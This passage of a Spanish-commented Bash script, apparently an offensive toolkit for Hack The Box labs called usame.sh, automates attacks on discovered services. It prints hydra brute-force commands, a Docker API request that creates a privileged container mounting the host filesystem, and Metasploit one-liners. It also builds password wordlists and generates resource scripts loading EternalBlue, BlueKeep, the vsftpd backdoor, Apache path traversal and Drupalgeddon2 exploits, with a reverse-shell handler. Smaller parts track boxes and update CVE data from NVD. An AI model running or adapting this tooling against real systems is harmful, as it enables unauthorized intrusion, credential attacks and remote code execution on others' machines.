            result="${result}    dig ANY @$TARGET domain.htb\n"
            result="${result}    dig TXT @$TARGET domain.htb\n"
            ;;
        snmp)
            result="${result}  [*] SNMP - community strings:\n"
            result="${result}    onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $TARGET\n"
            result="${result}    snmpwalk -v2c -c public $TARGET\n"
            result="${result}    snmp-check -c public $TARGET\n"
            result="${result}    hydra -P /usr/share/seclists/Discovery/SNMP/snmp.txt snmp://$TARGET\n"
            ;;
        vnc)
            result="${result}  [*] VNC - brute force:\n"
            result="${result}    nmap --script vnc-info,vnc-brute -p $port $TARGET\n"
            result="${result}    hydra -P /usr/share/wordlists/rockyou.txt vnc://$TARGET\n"
            result="${result}  [!] Si vacio:\n"
            result="${result}    vncviewer $TARGET:$port\n"
            ;;
        nfs)
            result="${result}  [*] NFS - enumeracion:\n"
            result="${result}    showmount -e $TARGET\n"
            result="${result}    nmap --script nfs-showmount,nfs-ls,nfs-statfs -p $port $TARGET\n"
            result="${result}  [!] Mount:\n"
            result="${result}    mkdir -p /mnt/nfs\n"
            result="${result}    mount -t nfs $TARGET:/<share> /mnt/nfs -o nolock\n"
            result="${result}  [!] Root squashing check:\n"
            result="${result}    cat /etc/exports | grep no_root_squash\n"
            ;;
        rpc)
            result="${result}  [*] RPC - enumeracion:\n"
            result="${result}    rpcclient -U '' -N $TARGET\n"
            result="${result}    rpcinfo -p $TARGET\n"
            result="${result}  [!] Dentro de rpcclient:\n"
            result="${result}    enumdomusers\n"
            result="${result}    enumdomgroups\n"
            result="${result}    lookupnames administrator\n"
            ;;
        rsync)
            result="${result}  [*] Rsync - enumeracion:\n"
            result="${result}    rsync $TARGET::\n"
            result="${result}    rsync -avz --list-only $TARGET::<module>/\n"
            result="${result}  [!] Brute force:\n"
            result="${result}    hydra -l <user> -P /usr/share/wordlists/rockyou.txt rsync://$TARGET -t 4\n"
            ;;
        docker)
            result="${result}  [*] Docker API expuesto:\n"
            result="${result}    curl http://$TARGET:$port/version\n"
            result="${result}    curl http://$TARGET:$port/containers/json\n"
            result="${result}  [!] RCE via container:\n"
            result="${result}    curl -X POST http://$TARGET:$port/containers/create -H 'Content-Type: application/json' -d '{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\"],\"Binds\":[\"/:/host\"],\"Privileged\":true}'\n"
            ;;
        iis)
            result="${result}  [*] IIS - enumeracion:\n"
            result="${result}    whatweb $TARGET\n"
            result="${result}    gobuster dir -u http://$TARGET/ -w /usr/share/wordlists/dirb/common.txt -x asp,aspx,php,config,bak -t 50\n"
            result="${result}    nmap --script http-iis-short-name-brute,http-webdav-scan -p $port $TARGET\n"
            if echo "$ver" | grep -q '6\.0'; then
                result="${result}  !!! IIS 6.0 WebDAV BOF (CVE-2017-7269) !!!\n"
                result="${result}  Metasploit: msfconsole -q -x 'use exploit/windows/iis/iis_webdav_scstoragepathfromurl; set RHOSTS $TARGET; set RPORT $port; exploit'\n"
            fi
            ;;
    esac
    echo -e "$result"
}

# ============================================================
# FUNCTION: Generar comandos Metasploit para un servicio
# ============================================================
get_metasploit_commands() {
    local svc="$1" port="$2"
    local svc_lower=$(to_lower "$svc")

    case "$svc_lower" in
        ftp)
            for m in auxiliary/scanner/ftp/ftp_version auxiliary/scanner/ftp/ftp_anon; do
                echo "use $m"
                echo "set RHOSTS $TARGET"
                echo "set RPORT $port"
                echo "run"
                echo ""
            done
            ;;
        http|https)
            echo "use auxiliary/scanner/http/http_version"
            echo "set RHOSTS $TARGET"
            echo "set RPORT $port"
            [ "$svc_lower" = "https" ] && echo "set SSL true"
            echo "run"
            ;;
        smb|microsoft-ds|netbios-ssn)
            for m in auxiliary/scanner/smb/smb_ms17_010 auxiliary/scanner/smb/smb_version; do
                echo "use $m"
                echo "set RHOSTS $TARGET"
                echo "set RPORT $port"
                echo "run"
                echo ""
            done
            ;;
        ssh)
            echo "use auxiliary/scanner/ssh/ssh_version"
            echo "set RHOSTS $TARGET"
            echo "set RPORT $port"
            echo "run"
            ;;
        mysql)
            echo "use auxiliary/scanner/mysql/mysql_login"
            echo "set RHOSTS $TARGET"
            echo "set RPORT $port"
            echo "set USERNAME root"
            echo "run"
            ;;
        mssql|ms-sql-s|ms-sql-m)
            echo "use auxiliary/scanner/mssql/mssql_login"
            echo "set RHOSTS $TARGET"
            echo "set RPORT $port"
            echo "set USERNAME sa"
            echo "run"
            ;;
        postgresql)
            echo "use auxiliary/scanner/postgres/postgres_login"
            echo "set RHOSTS $TARGET"
            echo "set RPORT $port"
            echo "set USERNAME postgres"
            echo "run"
            ;;
        rdp|ms-wbt-server)
            echo "use auxiliary/scanner/rdp/rdp_login"
            echo "set RHOSTS $TARGET"
            echo "set RPORT $port"
            echo "run"
            ;;
        smtp)
            echo "use auxiliary/scanner/smtp/smtp_enum"
            echo "set RHOSTS $TARGET"
            echo "set RPORT $port"
            echo "run"
            ;;
        snmp)
            echo "use auxiliary/scanner/snmp/snmp_enum"
            echo "set RHOSTS $TARGET"
            echo "set RPORT $port"
            echo "run"
            ;;
        redis)
            echo "use auxiliary/scanner/redis/redis_login"
            echo "set RHOSTS $TARGET"
            echo "set RPORT $port"
            echo "run"
            ;;
        mongodb)
            echo "use auxiliary/scanner/mongodb/mongodb_login"
            echo "set RHOSTS $TARGET"
            echo "set RPORT $port"
            echo "run"
            ;;
        ldap)
            echo "use auxiliary/scanner/ldap/ldap_search"
            echo "set RHOSTS $TARGET"
            echo "set RPORT $port"
            echo "run"
            ;;
        nfs)
            echo "use auxiliary/scanner/nfs/nfsmount"
            echo "set RHOSTS $TARGET"
            echo "set RPORT $port"
            echo "run"
            ;;
    esac
}

# ============================================================
# P3: WORDLIST GENERATOR
# ============================================================
generate_wordlist() {
    local target="$1"
    local outfile="$2"
    
    cat > "$outfile" << 'HEADER'
# Wordlist generada por usame.sh v5.0
# Basada en: hostname, dominio, servicios, patrones HTB
HEADER

    local last_octet=$(echo "$target" | awk -F. '{print $4}')
    local ip_base=$(echo "$target" | awk -F. '{print $1"."$2"."$3}')
    echo "$target" >> "$outfile"
    echo "$last_octet" >> "$outfile"
    echo "10.10.10.$last_octet" >> "$outfile"

    if [ -n "$XML_FILE" ] && [ -f "$XML_FILE" ]; then
        local domain
        domain=$(grep -oP 'Domain:\s*\K\S+' "$XML_FILE" 2>/dev/null | head -1)
        if [ -n "$domain" ]; then
            local dom_lower=$(to_lower "$domain")
            local dom_clean=$(echo "$dom_lower" | sed 's/\.local\|\.htb\|\.com\|\.org//')
            echo "$dom_lower" >> "$outfile"
            echo "$dom_clean" >> "$outfile"
            echo "${dom_clean}1!" >> "$outfile"
            echo "${dom_clean}123" >> "$outfile"
            echo "${dom_clean}2024" >> "$outfile"
            echo "${dom_clean}2025" >> "$outfile"
            echo "${dom_clean}2026" >> "$outfile"
            echo "Administrator" >> "$outfile"
            echo "administrator" >> "$outfile"
            echo "admin" >> "$outfile"
            echo "svc_${dom_clean}" >> "$outfile"
        fi

        local products
        products=$(grep -oP 'product="\K[^"]+' "$XML_FILE" 2>/dev/null | sort -u)
        while read -r prod; do
            [ -z "$prod" ] && continue
            local p_lower=$(to_lower "$prod" | tr ' ' '_')
            echo "$p_lower" >> "$outfile"
            echo "${p_lower}1!" >> "$outfile"
            echo "${p_lower}_admin" >> "$outfile"
        done <<< "$products"

        grep -oP 'User Name:\s*\K\S+' "$XML_FILE" 2>/dev/null >> "$outfile"
        grep -oP 'samAccountName">\K[^<]+' "$XML_FILE" 2>/dev/null >> "$outfile"
    fi

    cat >> "$outfile" << 'COMMON'
admin
administrator
root
toor
password
Password1
Password123!
P@ssw0rd
Welcome1
Changeme123!
guest
test
user
support
helpdesk
sql
oracle
backup
monitor
dev
deploy
svc
service
ssh
ftp
web
mail
www
ldap
dns
nfs
smb
COMMON

    sort -u "$outfile" -o "$outfile"
    
    echo -e "${G}  Wordlist generada: $outfile${W}"
    echo -e "${G}  $(wc -l < "$outfile") palabras unicas${W}"
}

# ============================================================
# P3: BOX TRACKER
# ============================================================
TRACKER_FILE="$OUTPUT_DIR/.tracker"

tracker_init() {
    mkdir -p "$OUTPUT_DIR"
    [ ! -f "$TRACKER_FILE" ] && touch "$TRACKER_FILE"
}

tracker_add() {
    local name="$1" os="$2" ports="$3" status="${4:-scanned}"
    tracker_init
    local ts=$(date '+%Y-%m-%d %H:%M:%S')
    grep -v "^${name}|" "$TRACKER_FILE" > "${TRACKER_FILE}.tmp" 2>/dev/null
    mv "${TRACKER_FILE}.tmp" "$TRACKER_FILE"
    echo "${name}|${os}|${ports}|${status}|${ts}" >> "$TRACKER_FILE"
}

tracker_list() {
    tracker_init
    if [ ! -s "$TRACKER_FILE" ]; then
        echo -e "${Y}  No hay boxes escaneadas aun.${W}"
        return
    fi
    echo -e "${B}${C}  BOXES ESCANEADAS:${W}"
    echo ""
    printf "  ${B}%-22s %-10s %-8s %-10s %s${W}\n" "NOMBRE" "SO" "PUERTOS" "STATUS" "ULTIMO SCAN"
    echo "  ---------------------------------------------------------------------"
    while IFS='|' read -r name os ports status ts; do
        local status_color="$G"
        [ "$status" = "owned" ] && status_color="$Y"
        [ "$status" = "rooted" ] && status_color="$M"
        printf "  %-22s %-10s %-8s ${status_color}%-10s${W} %s\n" "$name" "${os^^}" "$ports" "$status" "$ts"
    done < "$TRACKER_FILE"
    echo ""
}

tracker_history() {
    local box_name="$1"
    tracker_init
    echo -e "${B}${C}  HISTORIAL: $box_name${W}"
    echo ""
    if [ -f "$TRACKER_FILE" ]; then
        grep "^${box_name}|" "$TRACKER_FILE" | while IFS='|' read -r name os ports status ts; do
            echo "  SO: ${os^^} | Puertos: $ports | Status: $status | $ts"
        done
    fi
    echo ""
    echo "  Archivos en escaneos:"
    ls -lt "$OUTPUT_DIR"/ESCANEO_de_${box_name}_*.txt 2>/dev/null | while read -r line; do
        echo "    $line"
    done
    echo ""
}

tracker_mark() {
    local box_name="$1"
    local new_status="$2"
    if [ -z "$box_name" ] || [ -z "$new_status" ]; then
        echo "Uso: $0 --mark <nombre> <owned|rooted>"
        return 1
    fi
    if [ "$new_status" != "owned" ] && [ "$new_status" != "rooted" ]; then
        echo -e "${R}  Status invalido: $new_status (usa: owned o rooted)${W}"
        return 1
    fi
    tracker_init
    if grep -q "^${box_name}|" "$TRACKER_FILE"; then
        local line=$(grep "^${box_name}|" "$TRACKER_FILE")
        local os=$(echo "$line" | cut -d'|' -f2)
        local ports=$(echo "$line" | cut -d'|' -f3)
        tracker_add "$box_name" "$os" "$ports" "$new_status"
        echo -e "${G}  $box_name marcada como: $new_status${W}"
    else
        echo -e "${Y}  Box $box_name no encontrada. Ejecuta un scan primero.${W}"
    fi
}

# ============================================================
# P3: DIFF/COMPARACION
# ============================================================
diff_scans() {
    local target_ip="$1"
    
    local xml_newest=$(ls -t "$OUTPUT_DIR"/scan_${target_ip}_*.xml 2>/dev/null | head -1)
    local xml_previous=$(ls -t "$OUTPUT_DIR"/scan_${target_ip}_*.xml 2>/dev/null | head -2 | tail -1)
    
    if [ -z "$xml_newest" ]; then
        echo -e "${R}  No se encontraron escaneos para $target_ip${W}"
        return 1
    fi
    if [ -z "$xml_previous" ]; then
        echo -e "${Y}  Solo hay un escaneo para $target_ip. No hay nada que comparar.${W}"
        return 1
    fi
    
    echo -e "${B}${C}  DIFF: $target_ip${W}"
    echo -e "  Anterior: ${DIM}$xml_previous${W}"
    echo -e "  Nuevo:    ${DIM}$xml_newest${W}"
    echo ""
    
    local ports_old=$(grep -oP 'portid="\K[0-9]+' "$xml_previous" | sort -un)
    local ports_new=$(grep -oP 'portid="\K[0-9]+' "$xml_newest" | sort -un)
    
    local added=$(comm -13 <(echo "$ports_old") <(echo "$ports_new"))
    local removed=$(comm -23 <(echo "$ports_old") <(echo "$ports_new"))
    local common=$(comm -12 <(echo "$ports_old") <(echo "$ports_new"))
    
    local changes=0
    
    if [ -n "$added" ]; then
        echo -e "  ${G}[+] PUERTOS NUEVOS:${W}"
        while read -r p; do
            [ -z "$p" ] && continue
            local svc=$(grep -A5 "portid=\"$p\"" "$xml_newest" | grep -oP 'name="\K[^"]+' | head -1)
            local prod=$(grep -A5 "portid=\"$p\"" "$xml_newest" | grep -oP 'product="\K[^"]+' | head -1)
            echo -e "    ${G}+ $p/tcp${W} - $svc ($prod)"
            changes=$((changes + 1))
        done <<< "$added"
        echo ""
    fi
    
    if [ -n "$removed" ]; then
        echo -e "  ${R}[-] PUERTOS CERRADOS:${W}"
        while read -r p; do
            [ -z "$p" ] && continue
            local svc=$(grep -A5 "portid=\"$p\"" "$xml_previous" | grep -oP 'name="\K[^"]+' | head -1)
            echo -e "    ${R}- $p/tcp${W} - $svc"
            changes=$((changes + 1))
        done <<< "$removed"
        echo ""
    fi
    
    if [ -n "$common" ]; then
        echo -e "  ${Y}[~] CAMBIOS EN SERVICIOS:${W}"
        while read -r p; do
            [ -z "$p" ] && continue
            local svc_old=$(grep -A5 "portid=\"$p\"" "$xml_previous" | grep -oP 'product="\K[^"]+' | head -1)
            local ver_old=$(grep -A5 "portid=\"$p\"" "$xml_previous" | grep -oP 'version="\K[^"]+' | head -1)
            local svc_new=$(grep -A5 "portid=\"$p\"" "$xml_newest" | grep -oP 'product="\K[^"]+' | head -1)
            local ver_new=$(grep -A5 "portid=\"$p\"" "$xml_newest" | grep -oP 'version="\K[^"]+' | head -1)
            if [ "$svc_old" != "$svc_new" ] || [ "$ver_old" != "$ver_new" ]; then
                echo -e "    ${Y}~ $p/tcp${W}: ${DIM}$svc_old $ver_old${W} -> ${G}$svc_new $ver_new${W}"
                changes=$((changes + 1))
            fi
        done <<< "$common"
        echo ""
    fi
    
    local cves_old=$(grep -oP 'CVE-[0-9]+-[0-9]+' "$xml_previous" 2>/dev/null | sort -un)
    local cves_new=$(grep -oP 'CVE-[0-9]+-[0-9]+' "$xml_newest" 2>/dev/null | sort -un)
    local cves_added=$(comm -13 <(echo "$cves_old") <(echo "$cves_new"))
    
    if [ -n "$cves_added" ]; then
        echo -e "  ${R}[!] NUEVOS CVEs:${W}"
        while read -r cve; do
            [ -z "$cve" ] && continue
            echo -e "    ${R}! $cve${W}"
        done <<< "$cves_added"
        echo ""
    fi
    
    if [ "$changes" -eq 0 ] && [ -z "$cves_added" ]; then
        echo -e "  ${G}  Sin cambios detectados.${W}"
    fi
}

# ============================================================
# P3: AUTO-UPDATE CVE DATABASE
# ============================================================
update_cve_database() {
    echo -e "${B}${C}  ACTUALIZANDO BASE DE DATOS CVE...${W}"
    echo ""
    
    local backup_dir="$OUTPUT_DIR/cve_backups"
    mkdir -p "$backup_dir"
    cp "$CVE_DB_DIR/cve_linux.sh" "$backup_dir/cve_linux_$(date +%Y%m%d).sh" 2>/dev/null
    cp "$CVE_DB_DIR/cve_windows.sh" "$backup_dir/cve_windows_$(date +%Y%m%d).sh" 2>/dev/null
    
    local linux_queries=("openssh" "vsftpd" "proftpd" "apache" "nginx" "tomcat" "samba" "redis" "postgresql" "mysql" "linux_kernel" "glibc" "openssl" "systemd" "runc" "docker" "jenkins")
    local windows_queries=("windows" "exchange" "sharepoint" "outlook" "iis" "rdp" "smb" "mssql")

    echo -e "  Consultando NVD API (Linux)..."
    local lin_new
    lin_new=$(nvd_update_queries "$CVE_DB_DIR/cve_linux.sh" "LIN" "${linux_queries[@]}")
    echo ""
    echo -e "  Consultando NVD API (Windows)..."
    local win_new
    win_new=$(nvd_update_queries "$CVE_DB_DIR/cve_windows.sh" "WIN" "${windows_queries[@]}")
    
    echo ""
    local new_count=$((lin_new + win_new))
    if [ "$new_count" -gt 0 ]; then
        echo -e "${G}  +$new_count CVEs nuevos agregados a la base de datos.${W}"
        echo -e "${G}  Backups en: $backup_dir${W}"
    else
        echo -e "${Y}  No se encontraron CVEs nuevos (ya actualizado).${W}"
    fi
}

# Consulta NVD para una lista de terminos y append el resultado al archivo
# de base de datos correspondiente (LIN/WIN). El progreso va a stderr para no
# contaminar stdout (que devuelve unicamente el numero de CVEs nuevos).
nvd_update_queries() {
    local db_file="$1" prefix="$2"; shift 2
    local -a queries=("$@")
    local query result count cve_id desc severity matched_product
    local new_count=0
    for query in "${queries[@]}"; do
        echo -ne "    Query: $query... " >&2

        result=$(curl -s --max-time 30 --retry 1 "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${query}&resultsPerPage=200&pubStartDate=$(date -d '1 year ago' +%Y-%m-%dT00:00:00.000)&pubEndDate=$(date +%Y-%m-%dT23:59:59.999)" 2>/dev/null)

        if [ -n "$result" ]; then
            count=$(echo "$result" | python3 "$SCRIPT_DIR/lib/nvd_parser.py" "$query" 2>/dev/null)

            while IFS='|' read -r cve_id desc severity matched_product; do
                [ -z "$cve_id" ] && continue
                desc=$(echo "$desc" | sed 's/"/\\"/g; s/`/\\`/g; s/\\/\\\\/g')
                if ! grep -q "\[$cve_id\]" "$db_file" 2>/dev/null; then
                    echo "" >> "$db_file"
                    echo "CVE_${prefix}_DESCRIPTION[$cve_id]=\"Auto: $desc\"" >> "$db_file"
                    echo "CVE_${prefix}_AFFECTED[$cve_id]=\"$matched_product (auto-detected)\"" >> "$db_file"
                    echo "CVE_${prefix}_EXPLOIT[$cve_id]=\"Check NVD: https://nvd.nist.gov/vuln/detail/$cve_id\"" >> "$db_file"
                    echo "CVE_${prefix}_SEVERITY[$cve_id]=\"$severity\"" >> "$db_file"
                    new_count=$((new_count + 1))
                fi
            done <<< "$count"
            echo "done" >&2
        else
            echo "skipped" >&2
        fi
        sleep 7
    done
    echo "$new_count"
}

# ============================================================
# INTERACTIVE PORT SELECTION MENU
# ============================================================
# Web assist: tras el escaneo abre Firefox en los puertos web
# y agrega el host a /etc/hosts tras esperar el hostname.
setup_hosts_and_browser() {
    [ -t 0 ] || { vprint "Sin TTY: se omite web assist"; return; }

    local -a web_ports=()
    local port svc_lower scheme candidate
    for PORT in $ALL_PORTS; do
        get_port_info "$PORT"
        svc_lower=$(to_lower "$SVC_INFO")
        candidate=0
        case "$svc_lower" in
            http|https|http-proxy|ssl/http|http-alt|microsoft-httpd) candidate=1 ;;
        esac
        if [ "$candidate" -eq 0 ]; then
            case "$PORT" in
                80|443|8080|8081|8443|8000|8008|8888) candidate=1 ;;
            esac
        fi
        [ "$candidate" -eq 1 ] && web_ports+=("$PORT|$svc_lower")
    done

    if [ "${#web_ports[@]}" -eq 0 ]; then
        echo -e "  ${Y}[--web] No se encontraron puertos web (80/443/8080/...).${W}"
        return
    fi

    echo ""
    print_subsection "WEB ASSIST - Puertos web detectados"
    local -a urls_ip=()
    for entry in "${web_ports[@]}"; do
        port="${entry%%|*}"; svc_lower="${entry#*|}"
        scheme="http"
        [[ "$svc_lower" = *https* || "$port" = 443 || "$port" = 8443 ]] && scheme="https"
        urls_ip+=("$scheme://$TARGET:$port")
    done
    echo -e "  Se abrira Firefox en: ${urls_ip[*]}"
    echo -e "  ${Y}Se escribira en /etc/hosts la entrada que confirmes.${W}"
    read -p "  Continuar? [s/n]: " subs
    if [ "$subs" != "s" ] && [ "$subs" != "S" ]; then
        echo -e "  ${Y}Web assist cancelado.${W}"
        return
    fi

    echo -e "  ${G}Abriendo Firefox...${W}"
    firefox "${urls_ip[@]}" >/dev/null 2>&1 &

    read -p "  Escribe el hostname que se ve en el navegador (Enter = omitir): " WHOST
    WHOST=$(echo "$WHOST" | tr -d '[:space:]' | tr '[:upper:]' '[:lower:]')
    if [ -z "$WHOST" ]; then
        echo -e "  ${Y}Sin hostname: no se toca /etc/hosts (Firefox ya abierto por IP).${W}"
        return
    fi

    if ! [ -w /etc/hosts ]; then
        echo -e "  ${R}  /etc/hosts no escribible. Usame.sh esta pensado para correr con sudo.${W}"
        echo -e "  ${R}  Reintenta con 'sudo $0' o agrega manualmente:${W}"
        echo -e "    echo \"$TARGET $WHOST\" | sudo tee -a /etc/hosts"
        return
    fi

    if grep -qE "^[[:space:]]*${TARGET}[[:space:]]+${WHOST}([[:space:]]|\$)" /etc/hosts; then
        echo -e "  ${Y}  Ya existe la entrada $TARGET $WHOST en /etc/hosts.${W}"
    else
        echo -e "$TARGET\t$WHOST" >> /etc/hosts
        echo -e "  ${G}  Anadido a /etc/hosts: $TARGET $WHOST${W}"
    fi

    local -a urls_host=()
    for entry in "${web_ports[@]}"; do
        port="${entry%%|*}"; svc_lower="${entry#*|}"
        scheme="http"
        [[ "$svc_lower" = *https* || "$port" = 443 || "$port" = 8443 ]] && scheme="https"
        urls_host+=("$scheme://$WHOST:$port")
    done
    echo -e "  ${G}Reabriendo Firefox con el hostname...${W}"
    firefox "${urls_host[@]}" >/dev/null 2>&1 &
}

interactive_port_menu() {
    echo ""
    print_section "PUERTOS ABIERTOS - SELECCIONAR OBJETIVO"
    echo ""

    local PORTS_ARRAY=()
    local NUM=0

    for PORT in $ALL_PORTS; do
        NUM=$((NUM + 1))
        get_port_info "$PORT"
        local SVC="$SVC_INFO" PROD="$PROD_INFO" VER="$VER_INFO"
        local AE=$(get_auto_exploit "$SVC" "$PROD" "$VER" "$PORT")
        local HAS_EXPLOIT=""
        [ -n "$AE" ] && HAS_EXPLOIT=" ${R}[EXP available]${W}"
        printf "  ${B}%2d)${W} %-12s %-15s %-20s %s${W}%s\n" "$NUM" "${PORT}/tcp" "${SVC^^}" "$PROD" "$VER" "$HAS_EXPLOIT"
        PORTS_ARRAY+=("$PORT")
    done

    echo ""
    echo -e "  ${G}a)${W} Auto-explotar TODOS los servicios con exploit disponible"
    echo -e "  ${G}m)${W} Generar script Metasploit (.rc) para todos los puertos"
    echo -e "  ${G}s)${W} Seleccionar multiples puertos (ej: 1,3,5)"
    echo -e "  ${G}r)${W} Regenerar reporte completo"
    echo -e "  ${G}w)${W} Generar wordlist para este target"
    echo -e "  ${G}d)${W} Ver CVEs de un puerto especifico"
    echo -e "  ${G}0)${W} Salir"
    echo ""
    print_subsection "Seleccion"

    while true; do
        read -p "  Seleccion: " choice
        case "$choice" in
            0)
                echo -e "${Y}  Saliendo...${W}"
                return 0
                ;;
            a|A)
                auto_exploit_all
                return 0
                ;;
            m|M)
                generate_metasploit_rc
                return 0
                ;;
            s|S)
                read -p "  Puertos (ej: 1,3,5): " ports_input
                exploit_selected_ports "$ports_input"
                return 0
                ;;
            r|R)
                return 2  # signal to regenerate
                ;;
            w|W)
                generate_wordlist "$TARGET" "$OUTPUT_DIR/wordlist_${TARGET}_$(date +%Y%m%d_%H%M%S).txt"
                ;;
            d|D)
                read -p "  Numero de puerto: " port_num
                if [[ "$port_num" =~ ^[0-9]+$ ]] && [ "$port_num" -ge 1 ] && [ "$port_num" -le "${#PORTS_ARRAY[@]}" ]; then
                    local p="${PORTS_ARRAY[$((port_num-1))]}"
                    get_port_info "$p"
                    local svc="$SVC_INFO" prod="$PROD_INFO" ver="$VER_INFO"
                    echo ""
                    echo -e "${B}${C}  --- Puerto $p | $svc | $prod $ver ---${W}"
                    echo ""
                    get_auto_exploit "$svc" "$prod" "$ver" "$p"
                    echo ""
                    show_cves_for_os "$svc" "$prod" "$ver"
                    echo ""
                else
                    echo -e "${R}  Numero invalido${W}"
                fi
                ;;
            [0-9]*)
                if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le "${#PORTS_ARRAY[@]}" ]; then
                    local p="${PORTS_ARRAY[$((choice-1))]}"
                    get_port_info "$p"
                    local svc="$SVC_INFO" prod="$PROD_INFO" ver="$VER_INFO"
                    echo ""
                    echo -e "${B}${C}  === DETALLES PUERTO $p | $svc | $prod $ver ===${W}"
                    echo ""
                    echo -e "${B}  AUTO-EXPLOIT:${W}"
                    get_auto_exploit "$svc" "$prod" "$ver" "$p"
                    echo ""
                    echo -e "${B}  GUIA COMPLETA:${W}"
                    get_service_info "$svc" "$TARGET" "$p" 2>/dev/null
                    echo ""
                    echo -e "${B}  CVEs BASE DE DATOS:${W}"
                    show_cves_for_os "$svc" "$prod" "$ver"
                    echo ""
                    echo -e "${B}  CREDENCIALES POR DEFECTO:${W}"
                    check_default_creds "$svc" "$p" "$TARGET"
                    echo ""
                    echo -e "${B}  COMANDOS RAPIDOS:${W}"
                    get_quick_commands "$svc" "$p"
                    echo ""
                else
                    echo -e "${R}  Numero invalido${W}"
                fi
                ;;
            *)
                echo -e "${R}  Opcion invalida${W}"
                ;;
        esac
        echo ""
        print_subsection "Menu"
    done
}

# ============================================================
# AUTO EXPLOIT ALL
# ============================================================
auto_exploit_all() {
    echo ""
    echo -e "${B}${R}========================================================${W}"
    echo -e "${B}${R}  AUTO-EXPLOTACION AUTOMATICA${W}"
    echo -e "${B}${R}========================================================${W}"
    echo ""

    local EXPLOIT_COUNT=0
    local EXPLOIT_LOG="$OUTPUT_DIR/auto_exploit_${TARGET}_${TS}.log"
    echo "Auto-exploit log - $TARGET - $(date)" > "$EXPLOIT_LOG"

    for PORT in $ALL_PORTS; do
        get_port_info "$PORT"
        local SVC="$SVC_INFO" PROD="$PROD_INFO" VER="$VER_INFO"
        local AE=$(get_auto_exploit "$SVC" "$PROD" "$VER" "$PORT")

        if [ -n "$AE" ]; then
            EXPLOIT_COUNT=$((EXPLOIT_COUNT + 1))
            echo -e "${B}${M}[$EXPLOIT_COUNT] $SVC | $PROD $VER | Puerto $PORT${W}"
            echo "========================================" >> "$EXPLOIT_LOG"
            echo "SERVICE: $SVC | PRODUCT: $PROD | VERSION: $VER | PORT: $PORT" >> "$EXPLOIT_LOG"
            echo "$AE" >> "$EXPLOIT_LOG"
            echo ""
        fi
    done

    if [ "$EXPLOIT_COUNT" -eq 0 ]; then
        echo -e "${Y}  No se encontraron exploits automaticos para este target.${W}"
        echo -e "${Y}  Intenta con --full para escaneo mas agresivo.${W}"
        return 0
    fi

    echo -e "${B}${G}  $EXPLOIT_COUNT servicios con exploits disponibles${W}"
    echo -e "  Log completo: $EXPLOIT_LOG"
    echo ""

    read -p "  Ejecutar scans de Metasploit para todos? (s/n): " msf_choice
    if [ "$msf_choice" = "s" ] || [ "$msf_choice" = "S" ]; then
        generate_metasploit_rc
    fi
}

# ============================================================
# GENERAR METASPLOIT RC
# ============================================================
generate_metasploit_rc() {
    local MSF_RC="$OUTPUT_DIR/msf_${TARGET}_${TS}.rc"
    cat > "$MSF_RC" << MSFEOF
# usame.sh v5.0 - Metasploit Resource Script
# Target: $TARGET | Fecha: $(date '+%Y-%m-%d %H:%M:%S')
# Generado automaticamente por auto-exploit
#
set RHOSTS $TARGET
set RHOST $TARGET
set LHOST $MY_IP
set LPORT 4444
set ExitOnSession false
MSFEOF

    for PORT in $ALL_PORTS; do
        get_port_info "$PORT"
        local SVC="$SVC_INFO" PROD="$PROD_INFO" VER="$VER_INFO"
        local sl=$(to_lower "$SVC")

        local msf_cmds=$(get_metasploit_commands "$SVC" "$PORT")
        if [ -n "$msf_cmds" ]; then
            echo "" >> "$MSF_RC"
            echo "# === $SVC ($PROD $VER) - Puerto $PORT ===" >> "$MSF_RC"
            echo "$msf_cmds" >> "$MSF_RC"
            echo "" >> "$MSF_RC"
        fi

        # Agregar exploits especificos por version
        case "$sl" in
            ftp)
                if vsftpd_backdoor_vuln "$PROD" "$VER"; then
                    write_msf_module "$MSF_RC" "VSFTPD BACKDOOR" "exploit/unix/ftp/vsftpd_234_backdoor" "$PORT"
                fi
                ;;
            http|https)
                if apache_41773_vuln "$PROD" "$VER"; then
                    write_msf_module "$MSF_RC" "APACHE PATH TRAVERSAL 2.4.49" "exploit/multi/http/apache_normalize_path" "$PORT" "set TARGETURI /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
                fi
                if apache_42013_vuln "$PROD" "$VER"; then
                    write_msf_module "$MSF_RC" "APACHE RCE 2.4.50 (CVE-2021-42013)" "exploit/multi/http/apache_normalize_path" "$PORT" "set TARGETURI /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"
                fi
                if drupal_wf_vuln "$PROD" "$VER"; then
                    write_msf_module "$MSF_RC" "DRUPAL DRUPALGEDDON2" "exploit/multi/http/drupal_drupageddon2" "$PORT"
                fi
                ;;
            smb|microsoft-ds|netbios-ssn)
                write_msf_module "$MSF_RC" "ETERNALBLUE (MS17-010)" "exploit/windows/smb/ms17_010_eternalblue" "$PORT"
                write_msf_module "$MSF_RC" "ETERNALBLUE PS_EXEC (MS17-010)" "exploit/windows/smb/ms17_010_psexec" "$PORT"
                ;;
            rdp|ms-wbt-server)
                if bluekeep_vuln "$PROD" "$VER"; then
                    write_msf_module "$MSF_RC" "BLUEKEEP" "exploit/windows/rdp/rdp_bluekeep_rce" "$PORT" "set DISABLE_MAX_SMALL_HEADER true"
                fi
                ;;
            iis)
                if iis60_webdav_vuln "$PROD" "$VER"; then
                    write_msf_module "$MSF_RC" "IIS 6.0 WEBDAV BOF" "exploit/windows/iis/iis_webdav_scstoragepathfromurl" "$PORT"
                fi
                ;;
        esac
    done

    local HANDLER_RC="$OUTPUT_DIR/handler_${TARGET}_${TS}.rc"
    cat > "$HANDLER_RC" << HEOF
use exploit/multi/handler
set PAYLOAD $MSF_PAYLOAD
set LHOST $MY_IP
set LPORT $MSF_LPORT
set ExitOnSession false
exploit -j
HEOF

    echo -e "${B}${G}  Metasploit RC generado:${W}"
    echo -e "  $MSF_RC"
    echo -e "  $HANDLER_RC"
    echo ""
    echo -e "  ${B}Para ejecutar:${W}"
    echo -e "    msfconsole -r $MSF_RC"
    echo -e "  ${B}Handler:${W}"
    echo -e "    msfconsole -r $HANDLER_RC"
    echo ""
    [ -n "$EXPLOIT_LOG" ] && echo -e "  Log: $EXPLOIT_LOG"
}

# ============================================================
# EXPLOIT SELECTED PORTS
# ============================================================
exploit_selected_ports() {
    local input="$1"
    local ports_list=$(echo "$input" | tr ',' '\n')

